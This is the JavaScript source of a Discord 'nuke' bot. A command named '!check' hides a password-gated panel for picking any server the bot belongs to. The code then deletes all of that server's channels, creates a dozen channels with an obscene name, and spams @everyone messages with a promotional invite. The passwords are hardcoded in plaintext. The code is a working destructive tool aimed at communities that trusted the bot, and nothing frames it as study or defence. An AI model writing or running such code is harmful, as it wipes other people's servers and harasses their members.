const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server the bot is in to nuke it.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    // ====================== !CHECK FLOW ======================
    if (action === 'check') {
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', flags: MessageFlags.Ephemeral });

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select server to nuke')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password correct. Select server:',
          components: [new ActionRowBuilder().addComponents(select)],
          flags: MessageFlags.Ephemeral
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        await interaction.deferUpdate();
        const guild = client.guilds.cache.get(interaction.values[0]);
        userSessions.set(interaction.user.id, { guildId: guild.id });

        const actionSelect = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);

        await interaction.editReply({
          content: `**Selected Server:** ${guild.name}\nChoose action:`,
          components: [new ActionRowBuilder().addComponents(actionSelect)]
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        if (interaction.values[0] === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Confirm Nuke');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
          ));
          return await interaction.showModal(modal);
        }
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });

        await interaction.deferReply({ flags: MessageFlags.Ephemeral });

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

        const delay = ms => new Promise(r => setTimeout(r, ms));
        const invite = 'https://discord.gg/veynettas';

        try {
          await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });

          for (const ch of guild.channels.cache.values()) {
            await ch.delete().catch(() => {});
            await delay(400);
          }

          await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });

          let created = 0;
          for (let i = 0; i < 12; i++) {
            try {
              await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
              created++;
              await delay(700);
            } catch {}
          }

          const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');

          for (const ch of channels.values()) {
            for (let i = 0; i < 8; i++) ch.send(spamText).catch(() => {});
          }

          await interaction.editReply({ 
            content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
          });

        } catch (err) {
          console.error(err);
          await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
        }

        userSessions.delete(interaction.user.id);
      }
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
